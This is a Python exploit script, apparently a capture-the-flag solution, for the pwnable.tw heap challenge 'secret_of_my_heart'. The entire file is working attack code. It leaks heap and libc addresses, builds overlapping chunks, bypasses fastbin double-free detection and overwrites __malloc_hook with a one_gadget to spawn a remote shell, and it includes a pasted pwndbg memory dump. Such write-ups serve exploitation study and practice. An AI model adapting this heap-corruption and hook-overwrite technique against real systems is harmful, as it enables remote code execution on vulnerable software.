#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./secret_of_my_heart')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10302)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

def option(choice):
    sla(b"Your choice :", str(choice).encode('utf-8'))

def add(size, name, secret):
    option(1)
    sla(b"Size of heart : ", str(size).encode('utf-8'))
    sa(b"Name of heart :", name)
    sa(b"secret of my heart :", secret)

def show(idx):
    option(2)
    sla(b"Index :", str(idx).encode('utf-8'))
    reu(b"Name : ")
    name = rl().strip(b'\n')
    reu(b"Secret : ")
    secret = rl().strip(b'\n')
    return name, secret

def delete(idx):
    option(3)
    sla(b"Index :", str(idx).encode('utf-8'))

libc=ELF("libc.so.6")
io = start()
add(0xf0, b"A"*32, b"B"*0xf0)# sb1 #0
leak = show(0)
heap_base = uu64(leak[0].strip(b'A'*32)) - 0x10
info(f"heap leak : {hex(heap_base)}")
add(0x70,b"A"*0x20, b'B' * 0x70)    #1
add(0xf0,b"A"*0x20, b'C' * 0xf0)    #2
add(0x30,b"A"*0x20, b'D' * 0x30)    #3
delete(0)
delete(1)
add(0x78,b"A"*0x20 , b'E' * 0x70 + p64(0x180))  #4
delete(2)
add(0xf0,b"A"*0x20 , b'F' * 0xf0)   #5
leak=show(0)
libc.address=uu64(leak[1]) - 0x3c3b78
info(f"libc base {hex(libc.address)}")
add(0x68,b"s"*0x20 , b'e' * 8) #fb #0 and fb #2 points to same memory
add(0x68,b"s"*0x20 , b'x' * 8) #fb #4 bypass fastbin double free detection
"""
00:0000│  0x4dcdd000 ◂— 0x78 /* 'x' */
01:0008│  0x4dcdd008 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓     3 skipped
05:0028│  0x4dcdd028 —▸ 0x558469d57110 ◂— 'eeeeeeee' # idx 0
06:0030│  0x4dcdd030 ◂— 0xf0
07:0038│  0x4dcdd038 ◂— 0x4141414141414141 ('AAAAAAAA')
pwndbg> 
08:0040│  0x4dcdd040 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓     2 skipped
0b:0058│  0x4dcdd058 —▸ 0x558469d57010 ◂— 0x4646464646464646 ('FFFFFFFF')
0c:0060│  0x4dcdd060 ◂— 0x68 /* 'h' */
0d:0068│  0x4dcdd068 ◂— 0x7373737373737373 ('ssssssss')
... ↓     2 skipped
pwndbg> 
10:0080│  0x4dcdd080 ◂— 0x7373737373737373 ('ssssssss')
11:0088│  0x4dcdd088 —▸ 0x558469d57110 ◂— 'eeeeeeee' # idx 2
12:0090│  0x4dcdd090 ◂— 0x30 /* '0' */
13:0098│  0x4dcdd098 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓     3 skipped
17:00b8│  0x4dcdd0b8 —▸ 0x558469d57290 ◂— 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
pwndbg> 
18:00c0│  0x4dcdd0c0 ◂— 0x0

"""
delete(0)
delete(4)
delete(2)
add(0x68,b"s"*0x20 , p64(libc.address+0x3c3aed)) #overwrite fb fd
add(0x68,b"s"*0x20 , b"A"*19 + p64(libc.address+0xef6c4)) #overwrite __malloc_hook with one_gadget 
add(0x68,b"s"*0x20 , b"A"*19 + p64(libc.address+0xef6c4)) #overwrite __malloc_hook with one_gadget 
add(0x68,b"s"*0x20 , b"A"*19 + p64(libc.address+0xef6c4)) #overwrite __malloc_hook with one_gadget 
delete(5) # Trigger one_gadget with House Of Arjun 😎
io.interactive()
"""
0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
"""